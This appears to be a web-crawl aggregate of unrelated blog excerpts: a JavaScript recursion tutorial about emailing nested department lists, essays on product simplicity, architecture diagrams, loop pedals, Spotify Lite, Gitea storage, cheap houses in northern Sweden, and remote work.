      departments[departmentKeys[i]].forEach(<span>(<span>email</span>) =&gt;</span> sendEmail(email));
    } <span>else</span> {
      <span>for</span> (<span>let</span> dept <span>in</span> departments[departmentKeys[i]]) {
        <span>if</span> (<span>Array</span>.isArray(departments[departmentKeys[i]][dept])) {
          departments[departmentKeys[i]][dept].forEach(<span>(<span>email</span>) =&gt;</span> sendEmail(email));
        } <span>else</span> {
          <span>for</span> (<span>let</span> subDept <span>in</span> departments[departmentKeys[i]][dept])
            <span>if</span> (<span>Array</span>.isArray(departments[departmentKeys[i]][dept][subDept])) {
              departments[departmentKeys[i]][dept][subDept].forEach(<span>(<span>email</span>) =&gt;</span> sendEmail(email));
            }
        }
      }
    }
  }
}</code></pre>
<p>I've checked it out, maybe I've even written a little unit test for it. It looks like a mess, but it
works. With the amount of nested loops here you could argue that it's highly inefficient. Someone in
the background hollers <em>"Big O? More like Big OMG, am I right?"</em></p>
<p>Now of course, there are other ways we could have tackled this, but what we have at the moment
works. Anywho, it's just a little function and there's not too many email addresses in there and we
probably won't use it often, so it doesn't matter. Let's get back to working on more important
projects before the boss finds another side task for me to work on!</p>
<p>Five minutes later and your boss returns and mentions that they also want the function to still work
even if new departments, subdepartments, and email addresses are added to this data structure at a
later point. Okay, this changes things because now I need to factor in the possibility of
subsubsubdepartments, subsubsubsubdepartments and so on.</p>
<p>Suddenly my iterative function no longer satisifes the criteria.</p>
<p>But lo and behold, a recursive solution enters!</p>
<pre><code><span><span>function</span> <span>sendEmail</span>(<span>emailAddress</span>) </span>{
  <span>console</span>.log(<span>`sending email to <span>${emailAddress}</span>`</span>);
}

<span><span>function</span> <span>gatherEmailAddresses</span>(<span>departments</span>) </span>{
  <span>let</span> departmentKeys = <span>Object</span>.keys(departments);
  departmentKeys.forEach(<span>(<span>dept</span>) =&gt;</span> {
    <span>if</span> (<span>Array</span>.isArray(departments[dept])) {
      <span>return</span> departments[dept].forEach(<span>(<span>email</span>) =&gt;</span> sendEmail(email));
    }
    <span>return</span> gatherEmailAddresses(departments[dept]);
  });
}</code></pre>
<p>Okay, we finally have a function that makes use of recursion in something more fitting of a
real-life scenario. Let's explain how it all works.</p>
<p>Our function loops through the keys from the <code>companyEmailAddresses</code> …</p></article></section></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-89cfead268f30384aa7d"><div><p><em>TLDR: Simplicity is still a controversial topic. Most argue that consumers desire simpler products. Some argue that they want simplicity but only if it is executed correctly (what that means is often left undefined). And a few believe that it’s actually complexity that makes consumers buy. This disagreement is rooted in the fact that no one seems to agree on what simplicity means. I suggest avoiding using it in any professional capacity, in favor of a more precise tool kit. What motivates the buying decision are the 3 components of the Fogg Behavior Model: motivation, ability, and prompt. Motivation, in order to make the sale, can be further broken down into the Job To Be Done (why is the consumer hiring the product?) and acute satisfaction (how badly do they want it in that moment?). Ability, making a behavior easier or harder to do, can be subdivided into time, money, physical effort, mental effort, repetition, social deviance, location in space, and location in time. Getting comfortable with these concepts will give you a productive framework to work with when deciding what features to include/exclude, and help you create products people actually want to buy, use, and recommend.</em></p><p>One of the most fundamental theorems to have come out of behavior science is that <strong>shine changes behavior</strong>.</p><p>What’s shine? Shine is the emotion you feel when you feel successful. When you aced that job interview, got your first customer, or finally won that match in your game or sport. [1] By making behavior easy to do, you increase the probability that you’ll succeed instead of fail. When you succeed, you feel successful which reinforces the connection in your brain between that behavior and that positive feeling, and that leads  to behavior change.&nbsp;</p><p>Simplicity → Shine → Behavior Change.</p><p>Because simplicity means so many different things to so many different people, a more precise way to think about it is in terms of ability. High ability means a behavior is easy to do. Low ability means it’s hard to do. So when you’re thinking about consumer behavior change, think about increasing ability, making it easy to do.</p><p><em>For the purpose of this essay you can use consumer and user interchangeably.</em></p><p>Obvious right? Well, no. The problem with fields like behavior science is tool bias. Which I described in <a href="https://www.younglingfeynman.com/essays/covid" target="_blank">Covid-19 And Human (Ir)Rationality — PART 1</a>:</p><blockquote><p>“This is a fascinating bias I call tool bias (if it has an official name, let me know), which ties the complexity of the tool to the perception of difficulty. Math can appear complex even when the application is very simple. Influencing behavior can appear simple even when the application is very complex. This phenomenon occurs in comedy as well. It’s easy to underestimate how difficult it is to create a good set because the tools (language) are simple, so while you laugh you think, I could do this easily.”</p></blockquote><p>I.e. behavior science suffers from hindsight bias because it’s so easy to understand. It all appears obvious ex post facto.&nbsp;</p><p>If something seems easy, we think “that must BE easy.”</p><p>But if you were to ask around as to what creates behavior change, you’d get many different answers (mainly around motivation) but making things easy to do wouldn’t be one of them. [2]</p><p>Okay, if simplicity or more precisely, increasing ability is so important (and obvious) then why are products so complicated?</p><p>Because it’s that very complexity that sells.</p><p>When we see something that’s complex, we think “that must have a lot of value.” If you’re a consultant giving simple answers to complex problems, it seems as though you’re not very smart or, at the very least, you aren’t taking it seriously. When you make it so complex that people can hardly follow along, it becomes hard for people to estimate the boundaries of your knowledge.&nbsp;</p><p>E.g. suppose you hire a consultant to help you with next year’s strategy. If they give you a thick stack of papers that supports their conclusion, you’ll perceive it more favorably than if they give you a single sheet with 2 paragraphs on it, sharing that same conclusion. Complexity acts as a heuristic for value. [3]</p><p><em>An obvious, but important nonetheless note, is that truth has to be measured by truth, not truthiness. </em><strong><em>Complexity impacts truthiness but it has no correlation with truth</em></strong><em>. I.e. just because something is complex doesn’t make it true. Just because something is simple doesn’t make it false. But that’s exactly the cognitive bias we have and partly explains our obsession with data-driven arguments. Read </em><a href="https://www.younglingfeynman.com/essays/misleadingdata?rq=data" target="_blank"><em>Your Data Is Lying To You And You’re Listening</em></a><em> for more on that.</em></p><p>Is this only true in information? No. You see the same phenomenon from consumer products to enterprise software.</p><p>According to Thompson, Hamilton, and Rust (2005), increasing the complexity of a product can have a positive effect on consumer satisfaction because of an increase in perceived capability.</p><p>Look at the following products:</p><p><strong>Stripey toothpaste: </strong>Why do they go to so much trouble to make sure stripey toothpaste comes out of the tube, well… stripey? An overly logical engineer would see that and claim that you should just mix the products. It would have the exact same effect on oral hygiene and you’d actually save on cost. But that’s only correct if your customers were logical robots. But they’re emotional humans. Consumers simply don’t believe your toothpaste has 3 functions if they don’t see it. ‘’Healthy gums. Strong teeth. Fresh breath.” Show me, don’t tell me.</p><p><strong>Dishwashing tablet: </strong>Same argument. Just blend all the ingredients into one homogenous tablet. But again, I, the consumer, wouldn’t believe you.</p><p><strong>Toilet rim block: </strong>Look at how these simple blocks have grown in complexity. Multiple liquids in a container, different colored solid spheres, sticky discs you shoot onto your bowl, etc. [4]</p><p><strong>Coffee machine: </strong>The most expensive ones have the most gizmos. More features to increase perceived capability, which is exactly what I, the consumer, want. Take Dolce Gusto machines for example. A manual lever to flip to make coffee? What am I, a 17th-century peasant?! I’ll take the model with the fancy LCD touch screen so I can feel like Louis the 14th thank you very much.</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1606422050075_102553"><p><strong>Cars: </strong>Steering wheels with roughly similar complexity as NASA's mission control. Mirrors that can be moved electronically, are heated, dim based on light intensity, and more. Just take a look at the incredible feature set of these 2021headlights:</p></div><div data-block-type="2" id="block-yui_3_17_2_1_1606422050075_35746"><p><strong>iOS:</strong> Remember that the original “iPhone OS” didn’t even have an Appstore yet? Just the 15 apps that shipped with the phone. Now you got an app for everything, cameras that rival mirrorless cameras and DSLRs in the right conditions, and more power than many laptops.</p></div><div data-block-type="2" id="block-yui_3_17_2_1_1606422050075_27120"><div><p>It seems that if we want to sell more, we should simply add features.</p><p>Well, yes. But also… well, no.</p><p>There are many UX experts that advocate precisely this. “Simplicity is overrated and consumers, ceteris paribus, want more features because they want the most powerful products.”</p><p>This is partly true. Would you pay more for a phone that does less? It has a basic camera, or perhaps no camera, it has less memory, it’s not fast, it’s missing features (even if you don’t use them). Probably not. While one can imagine an audience of minimalists for that, one can’t imagine that they’d pay more for it than the flagship phone which sets the anchor for that particular price hierarchy.</p><p>But if that’s the whole story, that raises the question, why do products ever get disrupted? Surely, if features sell then Yahoo wouldn’t have gotten disrupted by Google. Or Netflix by Blockbuster. Or Facebook by Myspace. Or any other startup, since pretty much all of them started very simple.</p><p>The erroneous assumption here is that simple means getting rid of features. But a car that’s missing two wheels, the engine, and the body, that’s not simplicity. That’s not even a car. A bagless vacuum cleaner — &gt; a cordless bagless vacuum cleaner — &gt; the Dysons we have now with all kinds of attachments, different vacuum heads, and automatically adjusting suction levels… now you’ve got my attention. The “simple” Dysons still had high usability despite lower capability. So it’s not just about removing features, it’s about being diligent about which features you do add. And your customers are the arbiter that decide whether or not you got it right.</p><p>On top of that, Rust, Thompson, and Hamilton (2006) demonstrated that an increase in features (even the right features) doesn’t automatically translate into more consumer satisfaction. In fact, as perceived capability increases, perceived usability decreases. This is known as feature fatigue. (Thompson, Hamilton &amp; Rust, 2005; See also Kemenade, 2018).</p><p>So if we can’t simply add or remove features, how should we think about getting consumers to buy?</p><p>The user needs to want it (motivation), they need to be able to buy it (have the ability), and be provoked into buying it (prompt). (Fogg, 2009). Ability usually isn’t the most constraining factor. If a consumer really wants to buy something, they’ll take care of any cognitive dissonance for you. E.g. “I don’t have the space for this new guitar. But damn, I really want it. Okay, I’ll just clean up the attic, and then I’ll have enough space.” (Which they won’t do). Not carrying (enough) money is also not really an issue anymore with Apple Pay and the like.&nbsp;</p><p>You could imagine a physical constraint. E.g. they wanna buy but the product is too big to take home in their car. That’s a place where you could offer some delivery service to solve for ability. E.g. Ikea or AptDeco. Or your site only accepts credit cards, which are never used in The Netherlands. In which case the user probably wouldn’t buy because it’s too much of a hassle. </p><p>Prompts aren’t perfect in 2020 but rarely do products fail because they were so amazing yet the company simply forgot to tell people about it. And pretty much the only thing marketers actually understand is CTA: Call To Action, which is just another word for prompt. So buying is primarily a motivation issue. And secondarily an …</p></div></div></div>

<p>I’ve spent too many hours writing pages and pages of architecture docs that nobody ever read.</p>



<p>I’ve joined too many projects with gigantic architecture docs that were outdated and useless.</p>



<p>I’ve seen too many architecture docs that were mind-numbing prose descriptions of what should have been a diagram.</p>



<p>I’m sick of it. My rule nowadays is that <em>each team gets one diagram</em>. That’s the architecture doc. It can be as complex as it needs to be, but there can only be one per team.</p>



<p><strong>Why a diagram?</strong></p>



<ul><li>A picture is worth a thousand words. Never has that been more true than with architecture docs.</li><li>Nobody wants to sit there and read dozens of pages of prose when they could look at a diagram instead.</li><li>Maintaining all those pages of text is a nightmare as little things change gradually over time.</li></ul>



<p><strong>Why only one?</strong></p>



<ul><li>The chance of outdated info increases exponentially with the number of diagrams, rather than proportionally.</li><li>Eventually two “unrelated” things will need a connection between them that we didn’t foresee.</li><li>Onboarding and planning are easier when we can visualize everything<em> </em>in one place.</li></ul>



<p>You get one diagram. Use it well.</p>

<h3>A loop pedal is a stack</h3>
<p>A loop pedal is a magical device that lets you record in stacked layers. It's almost like editing something in Figma or Sketch, except each layer is the same "shape" as the first or root layer. And by <em>shape</em> here what I actually mean is <em>length</em>.</p>
<p>Like other guitar pedals, a loop pedal lives somewhere between your guitar (the input) and your amp (the output). It receives the input from your instrument and "does stuff" with it, before sending it onwards. For example, maybe you want to add some <strong>distortion</strong> or <strong>flange</strong> -- OR BOTH. Your guitar pedals are like the world's simplest data flow pipeline. </p>
<div data-language="text"><pre><code>Guitar -&gt; Distortion Pedal -&gt; Flanger Pedal -&gt; Chorus Pedal -&gt; Amp</code></pre></div>
<p>No cycles or braching in this DAG. I mean, maybe there could branching. Or cycles. I bet some guitarists do that, somehow. But that's beyond my pay grade.</p>
<p>Let's go back to our loop pedal and record something.</p>
<p>Imagine that I tap the loop pedal with my foot, play the following, and tap the pedal again.</p>

<p>Each X here might represent one "measure" or "bar" in music theory land, but that's mostly unfamiliar territory for me, too, so instead we can say that we've played the X chord (I wish there was an X chord) 8 times of some fixed duration.</p>
<p>This is now our root layer for our stack.</p>
<p>By default, the pedal will keep "looping" this layer. You can double-tap it to "stop the loop" (maybe you'd do this when you reach a new section of your song, like the chorus).</p>
<p>Otherwise, now it's time to add some more layers. Tap the pedal again and you add the following layer:</p>

<p>Maybe <code>y</code> is an awesome solo or something. Then you do it again.</p>
<div data-language="text"><pre><code>X X X X X X X X
  y   y     y y
z z z z z z z z</code></pre></div>
<p>Now, this pattern will keep repeating over and over, expanding to the right.</p>
<div data-language="text"><pre><code>X X X X X X X X X X X X X X X X --&gt;
  y   y     y y   y   y     y y --&gt;
z z z z z z z z z z z z z z z z --&gt;</code></pre></div>
<p>What happens if you are recording a layer that extends longer than the root layer? Good question. The recording simple wraps around to the beginning of the root layer and you can keep going. However you will notice that you are already hearing what you recorded for this layer, so that can sound strange. Let's show an example.</p>
<p>I'm going to add a layer that just plays ascending notes up the guitar neck (a really crappy solo) and have this layer wrap around.</p>
<div data-language="text"><pre><code>X X X X X X X X
  y   y     y y
z z z z z z z z
1 2 3 4 5 6 7 8</code></pre></div>
<p>So far, so good. Why not keep going...</p>
<div data-language="text"><pre><code>X X X X X X X X
  y   y     y y
z z z z z z z z
1 2 3 4 5 6 7 8
9 10</code></pre></div>
<p>As you can see, my latest layer wrapped around to the beginning, such that when I played the <code>9</code>, you would hear the <code>1</code> at the same time. This may or may not be what you want to do. I'm guessing.. no. Especially if you're playing some epic Type II guitar solo.</p>
<p>Thus, one of the more common use cases of the loop pedal is to lay down some repeatable groove that you can sing various verses or solo over. Instead of making the "unique" or "changable" a layer in your loop stack, you just keep that off to the side.</p>
<p>Reader beware that my loop pedal is relatively simple. There are other, better, more-intense loop pedals where you can have multiple different loop stacks going at the same time. For example, maybe you've got a loop going for the verses and another separate loop stack for the choruses in your song.</p>
<p>But I appreciate the simplicity of my pedal. The one thing I still haven't figured out is whether or not you can do the <code>pop</code> stack operation on it. The <a href="https://www.boss.info/us/products/rc-1/">documentation</a> suggests that you can erase the top layer of the stack, but I haven't figured it out yet. For now, I've been living in a <code>push</code> only world, flubs included, which you'll hear in the next section.</p>

<h4>Uncle Mike's Tips for Running a Zoom-Based Open Mic Night</h4>
<p>Big thanks to Uncle Mike for organizing our second Zoom family open mic night. He runs a tight ship, mostly trying to prevent me from launching into a <a href="https://www.charlieharrington.com/bullet-train-to-merlins-grave">Bullet Train to Merlin's Grave medley like at Popestock</a>.</p>
<p>To paraphrase his tips:</p>
<ul>
<li>Each performer gets one song, of "normal song length" (so that means no Tubular Bells)</li>
<li>Announce the order in advance</li>
<li>Tune up your instrument when you're on deck or in the hole</li>
<li>Don't worry about messing up, start over if you need to, this is fun. Music is the best!</li>
<li>Change your zoom settings to "Original Sound"</li>
</ul>
<p>This last one is key. Zoom does some "stuff" to make things sound "good" during boring work meetings that are boring. It's not optimized for fun singalongs that are fun. So, it's pretty much essential to <a href="https://support.zoom.us/hc/en-us/articles/115003279466-Enabling-option-to-preserve-original-sound">follow these steps</a> when you're singing and strumming over Zoom, unless you're trying to incorporate cosmic waves of hollow nothingness into your jam. Maybe you are?</p>
<p>Oh, you should check out Uncle Mike's music podcast, <a href="https://www.tellyouwhatpodcast.com/">Tell You What! The Podcast</a>. He interviews young musicians and bands on the run and it's fun and great and keeps you on your toes with new upcoming artists.</p>
<p>As Uncle Mike says, music is the best!</p></div></div>]]>

<p>What if, for some users, the very best Spotify is a little less Spotify? Spotify Lite started as an experiment that had to be proven, both from a technical and a product-market fit perspective. In 2017, we found that a significant portion of registrations in some of our fastest-growing markets were happening on Android devices much older than what we were used to seeing in North American and European markets. Because of storage constraints, many of our potential users couldn’t install Spotify, and the ones that could weren’t getting the full “Spotify experience”.</p>



<p>Our mission was clear: we needed to make Spotify accessible to users with constrained resources, i.e., unreliable networks or phones with limited storage, memory, and low-resolution screens. Now we needed a team.</p>



<h2>A flexible, Lite team</h2>



<p>The main Spotify Music Android client is divided into multiple features, all owned by separate teams. But for Spotify Lite, we formed a single, autonomous team to fully own the entire process of designing, developing, and releasing the app. This allowed us to roll out an MVP product in record time.</p>



<p>Before building the new app, the Spotify Lite team — a cross-functional mix of insights, design, product, and engineering — travelled to a number of locations where Lite would be available in order to experience the network and device constraints firsthand. It was absolutely critical to design Spotify Lite with our users in mind, and to experiment and iterate on the streaming experience for cases when devices have poor connectivity or are completely offline. Only then were we able to come up with an optimal, performant solution.</p>



<p>It should be noted that we wouldn’t have achieved success had it not been for the existing tooling that we were able to reuse — tools for enabling recommendations, playback, search, browsing, and instrumentation. We were building on all the work, experience, and knowledge that came before us, giving us the ability to focus on finding solutions for our users.</p>



<h2>Spotify Lite: Spotify’s first separate app</h2>



<p>Creating a more performant and smaller version of the Spotify app proved to be more challenging than we liked, as the codebase hadn’t been modularized. With these challenges in mind, we decided to build a new separate app from scratch, giving us the ability to quickly iterate, obtain feedback, and innovate freely.</p>



<p>Spotify Lite was initially built on an entirely different playback stack than the regular Android app. This allowed Lite to be as small as possible, with minimal memory and network data usage. Having a separate app enabled us to test new performance ideas and to gain insights, such as understanding how application size impacts the new user funnel. We no longer use the initial playback stack, and have evolved towards a tailored setup that guarantees stability and playback quality on unreliable networks.</p>



<p>Building Lite was a lot like packing a backpack for your travels. With limited space, you have to be selective in what you bring. Only the most crucial and necessary components were carried forward.</p>



<h2>A balancing act</h2>



<p>Shrinking the original Spotify app to create Spotify Lite brought up two crucial questions: What key elements of the original Spotify should remain intact to ensure listeners still get the “Spotify experience”? And what sacrifices do we need to make to ensure Spotify Lite does, in fact, remain light?&nbsp;</p>



<p>In answering the first question, we knew that keeping the brand look and feel was absolutely critical to giving listeners a Spotify they could recognize. So, we used the same design philosophy as the original Spotify Android app. However, given a range of constraints (smaller screens, quick/performant interactions), we had to adapt some of our design choices. For example, information density has to be reviewed with smaller screen sizes and lower resolutions in mind, as well as whether information is still readable on a broken or scratched screen (these phones have been around for a while!). We’ve recently added our heuristics for how to design for these constraints to the overall design strategy so that this is kept in mind for other apps and surfaces, as well.</p>



<figure><img loading="lazy" width="700" height="444" src="https://storage.googleapis.com/rnd-atspotify/sites/2/2020/12/Spotify-Lite_Iphone-Mockups-01-700x444.png" alt="" srcset="https://storage.googleapis.com/rnd-atspotify/sites/2/2020/12/Spotify-Lite_Iphone-Mockups-01-700x444.png 700w, https://storage.googleapis.com/rnd-atspotify/sites/2/2020/12/Spotify-Lite_Iphone-Mockups-01-250x159.png 250w, https://storage.googleapis.com/rnd-atspotify/sites/2/2020/12/Spotify-Lite_Iphone-Mockups-01-768x487.png 768w, https://storage.googleapis.com/rnd-atspotify/sites/2/2020/12/Spotify-Lite_Iphone-Mockups-01-1536x975.png 1536w, https://storage.googleapis.com/rnd-atspotify/sites/2/2020/12/Spotify-Lite_Iphone-Mockups-01-2048x1300.png 2048w, https://storage.googleapis.com/rnd-atspotify/sites/2/2020/12/Spotify-Lite_Iphone-Mockups-01-120x76.png 120w" sizes="(max-width: 700px) 100vw, 700px"></figure>



<p>Along with streamlining the design, we also had to shrink things down under the hood. The team put a lot of work into implementing all the known techniques for binary size reduction, as well as making tradeoffs when selecting features. As the app includes a native shared library for playback, we have experimented with many compiler and linker flags to prioritize a small app size. This includes, for instance, switching to the <em>lld</em> linker, employing link time code optimizations, and disabling certain language features like RTTI.&nbsp;</p>



<p>On the Android side, it was the use of App Bundles for application publishing, optimizing our R8 shrinking, carefully choosing dependency libraries, and stripping unused translations. We made an effort to reduce the install size, too. We store the shared library unpacked in the APK without copying it to the install folder, and allow users to store both the app and its cache and downloads separately on the SD card.</p>



<p>After the initial larger gains, it became harder and harder to reduce the app size. It was a constant balance between keeping it small while adding additional requested features. Along with monitoring the app download and install sizes in the Google Play Store, we added checks to our continuous delivery pipelines to prevent size bloat.</p>



<h2>Lite is different</h2>



<p>Because Lite was a brand-new concept, some of our work went beyond the app itself, leading to improvements to Spotify systems that other teams could benefit from, too.</p>



<p>Before Lite, developers could safely assume there was only one Spotify app for any given platform — the Android platform and the Android app were considered one and the same. Backend services — including those providing application views and deciding which features are enabled — were built with that assumption in mind. Some of these assumptions cascaded through many different parts of our internal systems.&nbsp;</p>



<p>When we added Lite to the mix, developers needed to know exactly which app a user was using, not just what platform they were on. We generalized that issue beyond our own app and built ways to identify all the apps in the Spotify ecosystem. That work paid off again each time anyone introduced a new Spotify app to the Android platform, including our sister apps <a rel="noreferrer noopener" href="https://www.spotify.com/us/kids/?utm_source=us-en_brand_contextual_text&amp;utm_medium=paidsearch&amp;utm_campaign=alwayson_ucanz_us_premiumbusiness_kids_brand+contextual-desktop+text+exact+us-en+google&amp;gclid=CjwKCAiA8Jf-BRB-EiwAWDtEGnamKsxw1Yx_w3KgzFDyJ1g4NKVvIUkc9jRA8fBFdlHCkR8pD4iHmBoCMLAQAvD_BwE&amp;gclsrc=aw.ds" target="_blank">Spotify Kids</a>, <a rel="noreferrer noopener" href="https://www.spotify.com/us/stations/" target="_blank">Spotify Stations</a>, and <a href="https://spotify-everywhere.com/collections/car-audio/products/polestar" target="_blank" rel="noreferrer noopener">Android Automotive</a>.</p>



<p>We also had to redesign parts of Spotify’s playback library with Lite constraints in mind — taking into account smaller download and installation sizes, memory usage, and the reduced feature set. Similar considerations have been applied to Spotify’s music and image transcoding services.</p>



<h2>Making Lite a big deal</h2>



<p>Our ambition is to be the best-in-class Lite app. We are constantly modifying and updating the app to adapt to our users and their ever-evolving needs. As we’ve seen positive adoption of Spotify Lite since launch, we’ve invested in performance improvements, quality, and resilience. We recently rolled out an overhaul of our client architecture to cater to our growing user base and to reduce playback latencies.</p>



<p>The birth of Spotify Lite has given us flexible solutions that our other apps have benefited from. One such example is our backend service that scales down images to use less network traffic. Another is the support for App Bundles, which has allowed us to reduce the app size significantly so that users only download the assets needed for their particular device. Creating a separate app was a first for our build system — one that laid the groundwork for building native dependencies, sharing code components, and setting up crash and ANR reporting for tracking app quality.</p>



<p>We are continuing our work to lower the barrier for people to access Spotify. We have our backlog full of ideas and performance improvements we want to keep investing in, not only for Lite but also for our other apps to benefit from.</p>

<p>Attachments, user avatars, repo avatars and LFS files can now be saved to disk, or served via minio. (More S3-compatible integrations may become available in the future!). Now there is no storage layer only on git data.
See <a href="https://docs.gitea.io/en-us/config-cheat-sheet/#storage-storage">https://docs.gitea.io/en-us/config-cheat-sheet/#storage-storage</a> about how to configure it.</p>

                <div>
                    <p>The mysterious YouTube algorithm had me stumble upon an unlikely phenomenon. It seems like people from all over the world are migrating to the North of Sweden. Why? Is this the start of a trend?</p>

<p>When I was about 15 years old I did a 3-day internship at a renowned web agency in Stockholm. Quite a long trip. Because that’s about 900 km away from my hometown Piteå located in the great North where I’m born and raised.</p>

<p>My first day was spent in a joint-project meeting with a TV advertising agency. That was a wild experience. The dress code seemed to be scarf + blazer, indoors (wtf?). <a href="https://reklamaremedhalsdukinomhus-blog.tumblr.com/" target="_blank">Apparently very typical for the ad industry in Sweden</a>. Another guy was extremely laid back with his shoes on the conference table, constantly doing pen-tricks. I later realized that this was my first “creative brainstorming meeting”.</p>

<p><img alt="Reklamare med halsduk inomhus" src="https://danielmarklund.com/assets/img/blog/reklamare-med-halsduk.jpg"> <img alt="Pen spinning" src="https://danielmarklund.com/assets/img/blog/pen-spinning.gif"></p>

<p>The project was divided into two parts, they did the TV ads and we would build some cool online social platform that went along with it. Probably in Flash, as usual back then. The client was a big Swedish food brand who wanted to find good use for the many sports stars they had signed.</p>

<p>One guy said (Yes. They were all men): “What if we create like a big fictive house where all the sports stars live together? Then you create a platform where the kids can log on and like, play games, read up about the sports stars, chat and do some trivia.”</p>

<p>Yes. This was around the year 2000, long before Facebook. Social platforms were very popular among kids already.</p>

<p>Another guy responded enthusiastically: “That’s a great idea. We can buy a disposable house up in the North. Then we shoot the TV ads there and you guys can use the exterior photos to make some cool-fantasy-interactive-house website. We can probably find a house for less than 150k that we abandon once it’s done. It’s dirt cheap up there.” (150k SEK is about $18k)</p>

<p>Me in my young mind: “Wait… what? 150k is a lot of money! Disposable house?”</p>

<p>After the meeting, my mentor said: “Yes, it’s a lot of money. For you. Considering they pay the same amount for every 15-second slot on prime time TV, it’s not that much money to them.”</p>

<p>That certainly brought new perspectives to the value of wearing scarves indoors. And to the value of money.</p>

<p>I never thought I would hear someone refer to a house in my home region as “disposable” again. But I was wrong…</p>

<h2 id="quick-history-lesson-very-simplified">Quick history lesson (very simplified)</h2>

<p>Back in the 16th century, when other countries successfully conquered land all over the world through colonization, Sweden realized that we could find similar resources in our own backyard.</p>

<p>Up until that point, nobody really paid much attention to the area called the Northlands (sv. Norrland) which makes up about 59% of the country (FIFTY-NINE PERCENT). It was even more sparsely populated back then. You would only find a lot of forest, some poor farmers, and Sámi people with their reindeers (natives).</p>

<p><img src="https://danielmarklund.com/assets/img/blog/norrland.jpg" alt="Norrland of Sweden"></p>

<p>Slowly Sweden started to colonize the North, following the coastline. But it wasn’t until late 1800 things really started to take off. First, an extensive sawmill industry was established. Utilizing the rivers as efficient transportation for driving logs down to mills at the coasts. Then some serious mining up in the mountains which established the need for better communications. Railroads ftw! Followed by the exploitation of hydropower in our numerous and powerful rivers (no pun intended).</p>

<p>To give you an idea of the success, here is the population growth in a neighboring city of mine:</p>

<p><img src="https://danielmarklund.com/assets/img/blog/pupulation-growth-lulea.jpg" alt="Growth in population, Luleå"></p>

<p>All cities along the coast followed the same exponential trend. Sweden experienced unprecedented growth because of this rapid industrialization.</p>

<p>Everybody was working hard for the benefit of a selected few. Unfortunately the Average Svenne was held back by old structures. As a result the wealth gap only increased as time passed. The situation was calling for a change.</p>

<p>Therefore in 1920, a successful political campaign was launched with the vision to create a more equal Sweden. Replacing a class society with a welfare state (sv. Folkhemmet). The recipe included workdays limited to 8 hours, paid vacation, pension, free healthcare, free dental care, free school, housing, and grants for having children.</p>

<p>The extension of this campaign is what made Sweden to one of the best and most equal countries in the world. <a href="https://index.goodcountry.org/" target="_blank">Their words</a>, not mine.</p>

<p>No matter where you lived in the country, you had the same rights. Construction of schools, libraries, health care, and supermarkets took place in the most remote places. Communities were established in unlikely places. The land was abundant. The resources as well. Do you want a house? Everybody gets a house!</p>

<p>Sweden was thriving, including the “small” colony in the North.</p>

<h2 id="the-situation-today">The situation today</h2>

<p>The same rights exists today and in financial terms Sweden is doing better than ever. But how is the countryside doing? Not so well.</p>

<p>Remote villages are on the decline as a result of urbanization. The jobs are moving closer to the cities along with the people. Schools, libraries, day cares, and supermarkets are closing down. It’s not as convenient to live in sparsely populated areas anymore. The North is no exception.</p>

<p>Result: The people are leaving, but the houses remain. That’s why you can find dirt cheap houses in the North of Sweden. Well. In some places at least.</p>

<p>Northern Sweden is extremely beautiful. It can be cold and harsh during the winter months, but the people here are skilled, tough, helpful, and welcoming.</p>

<p>The region is a hidden gem, often referred to the last remaining wilderness in Europe. Lush green and hot in the summers, where the sun never goes down.  Snow and northern lights in the winter. Let’s not forget the beautiful seasons in between.</p>

<p>Even people from abroad have started to take notice…</p>

<h2 id="cue-the-youtube-generation">Cue: the YouTube generation</h2>

<p>What do you get if you take the freedom of working from anywhere, throw in some existential crisis induced by “self-help gurus” / “life coaches”, combine this with tranquilizing nature and cheap ass housing?</p>

<p>You get: (Wait for it…)</p>

<p><mark><strong>YouTubers buying houses and moving to the North of Sweden!</strong></mark></p>

<blockquote>
  <p>“Renting in London for a year would be the same price (or more) as buying a property in Sweden. We basically bought a <strong>disposable house</strong>.”<br><small><em>Naomi &amp; Jack. Bought a house, forest and land for ~100k SEK ($12k USD)</em></small></p>
</blockquote>

<p>“Disposable house”, eh? There it was again.</p>

<h2 id="the-list">The list</h2>

<p>Believe me when I say: I’m extremely grateful for these people. They are giving more exposure to this region than any tourist agency could ever hope for. So from the bottom of our hearts: Thank you!</p>

<p>I’ll try to keep this list updated, so make sure to send me any tips. Get inspired. Move to Sweden! Make more people move north. Catch you on the flip side.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>As I prepare for my talk at <a href="https://www.digitalwarriors.tech/speakerwall/">Digital Warriors 2020</a>, entitled "from office to remote in 48h", I want to share some thoughts about the process of moving a company from office to remote-first and then to remote-only. This post represents what I've learned over the past eight years working at the best remote companies on the planet.</p>
<p>It's important to clarify that there are different stages of adoption of remote work. As a company moves towards remote only, they will go through these, and knowing the advantages is essential. It is also necessary to understand the risks.</p>
<p><img src="https://imgur.com/0BQj4dc.png" alt="On-prem vs. remote-first vs. remote only"></p>
<p>Initially, a company is mostly, if not wholly, on-premise. The fundamental dynamics at work are that there is no trust that people will perform at the required level unless they are present in person and supervised. On the other hand, people working in these dynamics will optimize to succeed in them. So they will make sure they are visible in the office, always appear busy, and do their best to be either diligent supervisors or competent executors. Of course, not all companies have these kinds of issues. This kind of company perhaps reserves the term "work at home" to describe days where people can work without coming to the office. Working from a holiday destination is unthinkable unless people are doing so during the holidays.</p>
<p>The next stage of going remote is remote-first. The idea is that the company can still be partially on-premise, but the processes change to accommodate remote workers, i.e., people who work remotely all year long. This stage has been accurately described by my old friend and <a href="https://twitter.com/df07/status/504677877544390656/photo/1">OK-est boss</a> <a href="https://twitter.com/df07">David Fullerton</a> in his excellent post "<a href="https://stackoverflow.blog/2013/02/01/why-we-still-believe-in-working-remotely/">Why We (Still) Believe in Working Remotely</a>":</p>
<blockquote>
<p>There's no halfsies in a distributed team. If even one person on the team is remote, every single person has to start communicating online. </p>
</blockquote>
<p>While this point is accurate, it is not all that is needed to move from on-premise to remote first. What is required is that all the <em>tools</em> become remote. Today, it is much easier to accomplish this feat than a few years back (for example, many teams use GitHub as source control, and GitHub is already a remote tool. If a team has on-premise git, then access needs to be granted through a VPN. As many people are remote, but not all, there's a risk of having the company split culturally between remote and on-premise. Regular retreats or in-office rotations are necessary to keep the bonds straight. For example, we had one yearly remote and non-remote retreat at Stack Overflow. Still, other London-area remotes and I also went to the London office regularly, and this paid off handsomely in making everyone feel part of the same company.</p>
